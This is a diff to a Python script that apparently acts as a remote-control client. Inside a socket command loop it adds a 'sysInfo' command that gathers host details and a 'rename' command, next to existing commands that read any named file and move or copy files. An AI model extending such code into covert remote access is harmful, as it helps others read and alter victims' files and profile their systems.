@@ -2,6 +2,7 @@ import socket
 import os
 import subprocess
 from pathlib import Path
+from platform import uname
 
 User = (
     subprocess.run("whoami", stdout=subprocess.PIPE)
@@ -51,6 +52,16 @@ while True:
         elif sent == "help":
             result = subprocess.run(sent, stdout=subprocess.PIPE)
             sending = result.stdout.decode()
+        elif sent == "sysInfo":
+            name = uname()
+            sending = f"""System: {name.system}\n
+            Node Name: {name.node}\n
+            Release: {name.release}\n
+            Version: {name.version}\n
+            Machine: {name.machine}\n
+            Processor: {name.processor}""".replace(
+                "   ", ""
+            )
         elif "print" in sent:
             File = sent.replace("print ", "")
             sending = open(File, "r").read()
@@ -63,6 +74,15 @@ while True:
             oldDest, File, dest = unpacked
             os.rename(oldDest + "\\" + File, dest + "\\" + File)
             sending = "Moved " + File + " to " + dest
+        elif "rename" in sent:
+            unpacked = sent.replace("rename ", "").split('"')
+            for i in unpacked:
+                if i == "" or i == " ":
+                    unpacked.remove(i)
+            print(unpacked)
+            File, newName = unpacked
+            os.rename(File, newName)
+            sending = "Renamed " + File + " to " + newName
         elif "copy" in sent:
             unpacked = sent.replace("copy ", "").split('"')
             for i in unpacked:
